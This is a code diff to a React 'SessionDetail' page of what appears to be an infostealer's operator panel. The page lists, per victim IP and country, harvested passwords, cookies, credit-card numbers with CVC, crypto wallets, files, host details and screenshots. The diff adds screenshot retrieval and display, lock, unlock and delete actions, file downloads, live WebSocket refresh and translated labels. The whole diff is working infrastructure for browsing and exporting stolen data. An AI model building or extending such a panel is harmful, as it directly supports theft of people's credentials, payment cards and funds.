@@ -1,10 +1,11 @@
-import { useState } from 'react'
+import { useEffect, useState } from 'react'
 import { useParams, useNavigate } from 'react-router-dom'
 import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
 import { formatDistanceToNow } from 'date-fns'
-import { ArrowLeft, Eye, EyeOff, Key, Cookie, CreditCard, Wallet, FileText, Monitor, Server, Download, Trash2, MessageSquare } from 'lucide-react'
+import { ArrowLeft, Eye, EyeOff, Key, Cookie, CreditCard, Wallet, FileText, Monitor, Server, Download, Trash2, MessageSquare, Image, Lock, Unlock } from 'lucide-react'
 import { api } from '@/lib/api'
-import { t } from '@/lib/i18n'
+import { wsClient } from '@/lib/ws'
+import { useI18n } from '@/lib/i18n'
 import { Button } from '@/components/ui/button'
 import { Skeleton } from '@/components/ui/skeleton'
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
@@ -23,6 +24,17 @@ import {
   DropdownMenuContent,
   DropdownMenuItem,
 } from '@/components/ui/dropdown-menu'
+import {
+  AlertDialog,
+  AlertDialogTrigger,
+  AlertDialogContent,
+  AlertDialogHeader,
+  AlertDialogTitle,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogCancel,
+  AlertDialogAction,
+} from '@/components/ui/alert-dialog'
 import { FlagIcon } from '@/components/charts/flag-icon'
 import type { SessionDetail, Note } from '@/types'
 
@@ -37,7 +49,16 @@ function formatBytes(bytes?: number): string {
 export default function SessionDetail() {
   const { id } = useParams()
   const navigate = useNavigate()
+  const { t } = useI18n()
   const [revealed, setRevealed] = useState<Set<string>>(new Set())
+  const [activeTab, setActiveTab] = useState('passwords')
+  const [screenshotState, setScreenshotState] = useState<{
+    status: 'loading' | 'present' | 'absent' | 'gone'
+    width: number
+    height: number
+    sizeKb: number
+    objectUrl: string | null
+  }>({ status: 'loading', width: 0, height: 0, sizeKb: 0, objectUrl: null })
 
   const query = useQuery<SessionDetail>({
     queryKey: ['session', id],
@@ -67,6 +88,24 @@ export default function SessionDetail() {
     onSuccess: () => queryClient.invalidateQueries({ queryKey: ['notes', id] }),
   })
 
+  const lockMutation = useMutation({
+    mutationFn: () => api.post(`/api/sessions/${id}/lock`),
+    onSuccess: () => queryClient.invalidateQueries({ queryKey: ['session', id] }),
+  })
+
+  const unlockMutation = useMutation({
+    mutationFn: () => api.post(`/api/sessions/${id}/unlock`),
+    onSuccess: () => queryClient.invalidateQueries({ queryKey: ['session', id] }),
+  })
+
+  const deleteMutation = useMutation({
+    mutationFn: () => api.del(`/api/sessions/${id}`),
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ['sessions'] })
+      navigate('/sessions')
+    },
+  })
+
   const toggleReveal = (id: string) => {
     setRevealed(prev => {
       const next = new Set(prev)
@@ -75,6 +114,73 @@ export default function SessionDetail() {
       return next
     })
   }
+
+  // Fetch the screenshot as a blob (auth required, JWT lives in localStorage).
+  // The blob URL is set on screenshotState for use by both the header
+  // thumbnail and the tab body <img> tag.
+  useEffect(() => {
+    if (!id) return
+    const token = typeof window !== 'undefined' ? localStorage.getItem('token') : null
+    const headers: Record<string, string> = {}
+    if (token) headers['Authorization'] = `Bearer ${token}`
+    let cancelled = false
+    let blobUrl: string | null = null
+    fetch(`/api/sessions/${id}/screenshot`, { method: 'GET', headers })
+      .then(async (res) => {
+        if (cancelled) return
+        if (res.status === 404) {
+          setScreenshotState({ status: 'absent', width: 0, height: 0, sizeKb: 0, objectUrl: null })
+          return
+        }
+        if (res.status === 410) {
+          setScreenshotState({ status: 'gone', width: 0, height: 0, sizeKb: 0, objectUrl: null })
+          return
+        }
+        if (!res.ok) {
+          setScreenshotState({ status: 'absent', width: 0, height: 0, sizeKb: 0, objectUrl: null })
+          return
+        }
+        const buf = new Uint8Array(await res.arrayBuffer())
+        const sizeBytes = Number(res.headers.get('Content-Length') ?? buf.length)
+        let w = 0
+        let h = 0
+        if (buf.length >= 30 && buf[0] === 0x42 && buf[1] === 0x4d) {
+          const dv = new DataView(buf.buffer, buf.byteOffset, buf.byteLength)
+          if (dv.getUint32(14, true) >= 40) {
+            w = dv.getInt32(18, true)
+            h = dv.getInt32(22, true)
+          }
+        }
+        const blob = new Blob([buf], { type: res.headers.get('Content-Type') ?? 'image/bmp' })
+        blobUrl = URL.createObjectURL(blob)
+        setScreenshotState({
+          status: 'present',
+          width: w,
+          height: h,
+          sizeKb: Math.max(1, Math.round(sizeBytes / 1024)),
+          objectUrl: blobUrl,
+        })
+      })
+      .catch(() => {
+        if (!cancelled) setScreenshotState({ status: 'absent', width: 0, height: 0, sizeKb: 0, objectUrl: null })
+      })
+    return () => {
+      cancelled = true
+      if (blobUrl) URL.revokeObjectURL(blobUrl)
+    }
+  }, [id])
+
+  // Auto-refresh on session update via WebSocket
+  useEffect(() => {
+    if (!id) return
+    const unsub = wsClient.on('session_update', (data: any) => {
+      if (data?.session_id === id) {
+        queryClient.invalidateQueries({ queryKey: ['session', id] })
+        queryClient.invalidateQueries({ queryKey: ['notes', id] })
+      }
+    })
+    return unsub
+  }, [id, queryClient])
 
   if (query.isLoading) {
     return (
@@ -92,15 +198,16 @@ export default function SessionDetail() {
   if (!query.data) {
     return (
       <div className="flex flex-col items-center justify-center min-h-[60vh] text-muted-foreground gap-4">
-        <p className="text-lg font-medium">Session not found</p>
+        <p className="text-lg font-medium">{t('session.not_found')}</p>
         <Button variant="outline" onClick={() => navigate('/sessions')}>
-          Back to Sessions
+          {t('session.back')}
         </Button>
       </div>
     )
   }
 
   const session = query.data
+  const isLocked = (session as any).locked as boolean | undefined
 
   return (
     <div className="space-y-6">
@@ -114,25 +221,93 @@ export default function SessionDetail() {
             <DropdownMenuTrigger asChild>
               <Button variant="outline" size="sm">
                 <Download className="h-4 w-4 mr-2" />
-                Export
+                {t('session.export')}
               </Button>
             </DropdownMenuTrigger>
             <DropdownMenuContent>
               <DropdownMenuItem onClick={() => window.open(`/api/export/session/${id}?format=json`)}>
-                Export as JSON
+                {t('session.export')} as JSON
               </DropdownMenuItem>
               <DropdownMenuItem onClick={() => window.open(`/api/export/session/${id}?format=html`)}>
-                Export as HTML
+                {t('session.export')} as HTML
               </DropdownMenuItem>
             </DropdownMenuContent>
           </DropdownMenu>
         </div>
+        <div className="flex items-center gap-2">
+          {isLocked ? (
+            <Button
+              variant="outline"
+              size="sm"
+              onClick={() => unlockMutation.mutate()}
+              disabled={unlockMutation.isPending}
+            >
+              <Unlock className="h-4 w-4 mr-2" />
+              Unlock
+            </Button>
+          ) : (
+            <Button
+              variant="outline"
+              size="sm"
+              onClick={() => lockMutation.mutate()}
+              disabled={lockMutation.isPending}
+            >
+              <Lock className="h-4 w-4 mr-2" />
+              Lock
+            </Button>
+          )}
+          <AlertDialog>
+            <AlertDialogTrigger asChild>
+              <Button variant="destructive" size="sm">
+                <Trash2 className="h-4 w-4 mr-2" />
+                Delete
+              </Button>
+            </AlertDialogTrigger>
+            <AlertDialogContent>
+              <AlertDialogHeader>
+                <AlertDialogTitle>Delete Session</AlertDialogTitle>
+                <AlertDialogDescription>
+                  Are you sure you want to delete this session? This action cannot be undone.
+                </AlertDialogDescription>
+              </AlertDialogHeader>
+              <AlertDialogFooter>
+                <AlertDialogCancel>Cancel</AlertDialogCancel>
+                <AlertDialogAction onClick={() => deleteMutation.mutate()} className="bg-destructive text-destructive-foreground hover:bg-destructive/90">
+                  Delete
+                </AlertDialogAction>
+              </AlertDialogFooter>
+            </AlertDialogContent>
+          </AlertDialog>
+        </div>
       </div>
 
-      <div className="flex items-center gap-3">
-        <h1 className="text-2xl font-bold font-mono">{session.ip}</h1>
-        <FlagIcon country={session.country_code ?? ''} width={24} height={24} />
-        <span className="text-sm text-muted-foreground font-mono">{session.country_code}</span>
+      <div className="flex items-center justify-between gap-3">
+        <div className="flex items-center gap-3">
+          <h1 className="text-2xl font-semibold tracking-tight font-mono">{session.ip}</h1>
+          <FlagIcon country={session.country_code ?? ''} width={24} height={24} />
+          <span className="text-sm text-muted-foreground font-mono">{session.country_code}</span>
+          {isLocked && (
+            <span className="inline-flex items-center gap-1 text-xs text-amber-500 bg-amber-500/10 px-2 py-0.5 rounded-full">
+              <Lock className="h-3 w-3" /> Locked
+            </span>
+          )}
+        </div>
+        {screenshotState.status !== 'absent' && screenshotState.status !== 'gone' && id && (
+          <button
+            type="button"
+            onClick={() => setActiveTab('screenshot')}
+            className="relative h-12 w-20 overflow-hidden rounded-md border border-border bg-muted hover:opacity-90 transition-opacity shrink-0"
+            aria-label={t('session.screenshot')}
+          >
+            {screenshotState.objectUrl && (
+              <img
+                src={screenshotState.objectUrl}
+                alt=""
+                className="h-full w-full object-cover"
+              />
+            )}
+          </button>
+        )}
       </div>
 
       <div className="flex flex-wrap gap-3 text-sm text-muted-foreground">
@@ -143,8 +318,8 @@ export default function SessionDetail() {
         <span>Created: <span className="font-mono text-foreground">{formatDistanceToNow(new Date(session.created_at), { addSuffix: true })}</span></span>
       </div>
 
-      <Tabs defaultValue="passwords">
-        <TabsList className="w-full justify-start">
+      <Tabs value={activeTab} onValueChange={setActiveTab}>
+        <TabsList className="w-full justify-start bg-muted/60 border border-border p-1">
           <TabsTrigger value="passwords">
             <Key className="h-4 w-4 mr-1" />
             {t("session.passwords")} ({session.passwords?.length ?? 0})
@@ -167,7 +342,11 @@ export default function SessionDetail() {
           </TabsTrigger>
           <TabsTrigger value="system">
             <Monitor className="h-4 w-4 mr-1" />
-            System Info
+            {t('session.system')}
+          </TabsTrigger>
+          <TabsTrigger value="screenshot">
+            <Image className="h-4 w-4 mr-1" />
+            {t('session.screenshot')}
           </TabsTrigger>
           <TabsTrigger value="notes">
             <MessageSquare className="h-4 w-4 mr-1" />
@@ -182,17 +361,17 @@ export default function SessionDetail() {
                 <TableHeader>
                   <TableRow>
                     <TableHead className="w-8">#</TableHead>
-                    <TableHead>URL</TableHead>
-                    <TableHead>Username</TableHead>
-                    <TableHead>Password</TableHead>
-                    <TableHead>Browser</TableHead>
+                    <TableHead>{t('table.url')}</TableHead>
+                    <TableHead>{t('table.username')}</TableHead>
+                    <TableHead>{t('table.password')}</TableHead>
+                    <TableHead>{t('table.browser')}</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
                   {session.passwords?.length === 0 ? (
                     <TableRow>
                       <TableCell colSpan={5} className="h-24 text-center text-muted-foreground">
-                        No passwords found
+                        {t('session.no_passwords')}
                       </TableCell>
                     </TableRow>
                   ) : (
@@ -231,17 +410,17 @@ export default function SessionDetail() {
                 <TableHeader>
                   <TableRow>
                     <TableHead className="w-8">#</TableHead>
-                    <TableHead>Domain</TableHead>
-                    <TableHead>Name</TableHead>
-                    <TableHead>Value</TableHead>
-                    <TableHead>Path</TableHead>
+                    <TableHead>{t('table.domain')}</TableHead>
+                    <TableHead>{t('table.name')}</TableHead>
+                    <TableHead>{t('table.value')}</TableHead>
+                    <TableHead>{t('table.path')}</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
                   {session.cookies?.length === 0 ? (
                     <TableRow>
                       <TableCell colSpan={5} className="h-24 text-center text-muted-foreground">
-                        No cookies found
+                        {t('session.no_cookies')}
                       </TableCell>
                     </TableRow>
                   ) : (
@@ -268,17 +447,17 @@ export default function SessionDetail() {
                 <TableHeader>
                   <TableRow>
                     <TableHead className="w-8">#</TableHead>
-                    <TableHead>Number</TableHead>
-                    <TableHead>Expires</TableHead>
-                    <TableHead>Holder</TableHead>
-                    <TableHead>CVC</TableHead>
+                    <TableHead>{t('table.number')}</TableHead>
+                    <TableHead>{t('table.expires')}</TableHead>
+                    <TableHead>{t('table.holder')}</TableHead>
+                    <TableHead>{t('table.cvc')}</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
                   {session.cards?.length === 0 ? (
                     <TableRow>
                       <TableCell colSpan={5} className="h-24 text-center text-muted-foreground">
-                        No cards found
+                        {t('session.no_cards')}
                       </TableCell>
                     </TableRow>
                   ) : (
@@ -319,15 +498,15 @@ export default function SessionDetail() {
                 <TableHeader>
                   <TableRow>
                     <TableHead className="w-8">#</TableHead>
-                    <TableHead>Name</TableHead>
-                    <TableHead>Path</TableHead>
+                    <TableHead>{t('table.name')}</TableHead>
+                    <TableHead>{t('table.path')}</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
                   {session.wallets?.length === 0 ? (
                     <TableRow>
                       <TableCell colSpan={3} className="h-24 text-center text-muted-foreground">
-                        No wallets found
+                        {t('session.no_wallets')}
                       </TableCell>
                     </TableRow>
                   ) : (
@@ -352,15 +531,16 @@ export default function SessionDetail() {
                 <TableHeader>
                   <TableRow>
                     <TableHead className="w-8">#</TableHead>
-                    <TableHead>Filename</TableHead>
-                    <TableHead className="text-right">Size</TableHead>
+                    <TableHead>{t('table.filename')}</TableHead>
+                    <TableHead className="text-right">{t('table.size')}</TableHead>
+                    <TableHead className="w-12"></TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
                   {session.files?.length === 0 ? (
                     <TableRow>
-                      <TableCell colSpan={3} className="h-24 text-center text-muted-foreground">
-                        No files found
+                      <TableCell colSpan={4} className="h-24 text-center text-muted-foreground">
+                        {t('session.no_files')}
                       </TableCell>
                     </TableRow>
                   ) : (
@@ -369,6 +549,16 @@ export default function SessionDetail() {
                         <TableCell className="text-muted-foreground text-xs">{i + 1}</TableCell>
                         <TableCell className="font-mono text-xs">{f.filename ?? '-'}</TableCell>
                         <TableCell className="text-right tabular-nums text-xs">{formatBytes(f.size)}</TableCell>
+                        <TableCell className="text-right">
+                          <a
+                            href={`/api/sessions/${id}/files/${f.id}/download`}
+                            className="inline-flex items-center text-muted-foreground hover:text-foreground"
+                            title="Download"
+                            onClick={(e) => e.stopPropagation()}
+                          >
+                            <Download className="h-3.5 w-3.5" />
+                          </a>
+                        </TableCell>
                       </TableRow>
                     ))
                   )}
@@ -384,7 +574,7 @@ export default function SessionDetail() {
               <>
                 <Card>
                   <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                    <CardTitle className="text-sm font-medium">CPU</CardTitle>
+                    <CardTitle className="text-sm font-medium">{t('system.cpu')}</CardTitle>
                     <Server className="h-4 w-4 text-muted-foreground" />
                   </CardHeader>
                   <CardContent>
@@ -393,7 +583,7 @@ export default function SessionDetail() {
                 </Card>
                 <Card>
                   <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                    <CardTitle className="text-sm font-medium">GPU</CardTitle>
+                    <CardTitle className="text-sm font-medium">{t('system.gpu')}</CardTitle>
                     <Monitor className="h-4 w-4 text-muted-foreground" />
                   </CardHeader>
                   <CardContent>
@@ -402,7 +592,7 @@ export default function SessionDetail() {
                 </Card>
                 <Card>
                   <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                    <CardTitle className="text-sm font-medium">RAM</CardTitle>
+                    <CardTitle className="text-sm font-medium">{t('system.ram')}</CardTitle>
                     <Server className="h-4 w-4 text-muted-foreground" />
                   </CardHeader>
                   <CardContent>
@@ -411,7 +601,7 @@ export default function SessionDetail() {
                 </Card>
                 <Card>
                   <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                    <CardTitle className="text-sm font-medium">Operating System</CardTitle>
+                    <CardTitle className="text-sm font-medium">{t('system.os')}</CardTitle>
                     <Monitor className="h-4 w-4 text-muted-foreground" />
                   </CardHeader>
                   <CardContent>
@@ -420,7 +610,7 @@ export default function SessionDetail() {
                 </Card>
                 <Card>
                   <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                    <CardTitle className="text-sm font-medium">Screen</CardTitle>
+                    <CardTitle className="text-sm font-medium">{t('system.screen')}</CardTitle>
                     <Monitor className="h-4 w-4 text-muted-foreground" />
                   </CardHeader>
                   <CardContent>
@@ -429,7 +619,7 @@ export default function SessionDetail() {
                 </Card>
                 <Card>
                   <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                    <CardTitle className="text-sm font-medium">Hostname</CardTitle>
+                    <CardTitle className="text-sm font-medium">{t('system.hostname')}</CardTitle>
                     <Server className="h-4 w-4 text-muted-foreground" />
                   </CardHeader>
                   <CardContent>
@@ -438,7 +628,7 @@ export default function SessionDetail() {
                 </Card>
                 <Card>
                   <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                    <CardTitle className="text-sm font-medium">Local IP</CardTitle>
+                    <CardTitle className="text-sm font-medium">{t('system.local_ip')}</CardTitle>
                     <Server className="h-4 w-4 text-muted-foreground" />
                   </CardHeader>
                   <CardContent>
@@ -447,7 +637,7 @@ export default function SessionDetail() {
                 </Card>
                 <Card>
                   <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                    <CardTitle className="text-sm font-medium">MAC Address</CardTitle>
+                    <CardTitle className="text-sm font-medium">{t('system.mac')}</CardTitle>
                     <Server className="h-4 w-4 text-muted-foreground" />
                   </CardHeader>
                   <CardContent>
@@ -457,19 +647,58 @@ export default function SessionDetail() {
               </>
             ) : (
               <div className="col-span-full text-center text-muted-foreground py-8">
-                No system information available
+                {t('session.no_system')}
               </div>
             )}
           </div>
         </TabsContent>
 
+        <TabsContent value="screenshot">
+          <Card>
+            <CardContent className="pt-6">
+              {screenshotState.status === 'loading' ? (
+                <Skeleton className="w-full aspect-video rounded-md" />
+              ) : screenshotState.status === 'gone' ? (
+                <div className="text-sm text-muted-foreground">{t('session.screenshot_missing')}</div>
+              ) : screenshotState.status === 'absent' ? (
+                <div className="text-sm text-muted-foreground">{t('session.no_screenshot')}</div>
+              ) : (
+                <div className="space-y-3">
+                  <div className="relative w-full overflow-hidden rounded-md border border-border bg-muted">
+                    {screenshotState.objectUrl && (
+                      <img
+                        src={screenshotState.objectUrl}
+                        alt={t('session.screenshot')}
+                        className="w-full h-auto block"
+                      />
+                    )}
+                  </div>
+                  <div className="flex items-center justify-between text-xs text-muted-foreground">
+                    <div className="font-mono">
+                      {screenshotState.width}×{screenshotState.height} · {screenshotState.sizeKb} KB
+                    </div>
+                    <a
+                      href={screenshotState.objectUrl ?? '#'}
+                      target="_blank"
+                      rel="noreferrer"
+                      className="inline-flex items-center gap-1 hover:text-foreground"
+                      download={`screenshot-${id}.bmp`}
+                    >
+                      <Download className="h-3 w-3" /> {t('session.screenshot_open')}
+                    </a>
+                  </div>
+                </div>
+              )}
+            </CardContent>
+          </Card>
+        </TabsContent>
         <TabsContent value="notes">
           <Card>
             <CardContent className="space-y-4 pt-6">
               <div className="flex gap-2">
                 <textarea
                   className="flex min-h-[80px] w-full rounded-md border border-input bg-transparent px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2"
-                  placeholder="Add a note..."
+                  placeholder={t('session.add_note')}
                   value={newNote}
                   onChange={e => setNewNote(e.target.value)}
                 />
@@ -489,7 +718,7 @@ export default function SessionDetail() {
                   <Skeleton className="h-16 w-full" />
                 </div>
               ) : notesQuery.data?.length === 0 ? (
-                <p className="text-center text-muted-foreground py-4">No notes yet</p>
+                <p className="text-center text-muted-foreground py-4">{t('session.no_notes')}</p>
               ) : (
                 <div className="space-y-2">
                   {notesQuery.data?.map(note => (
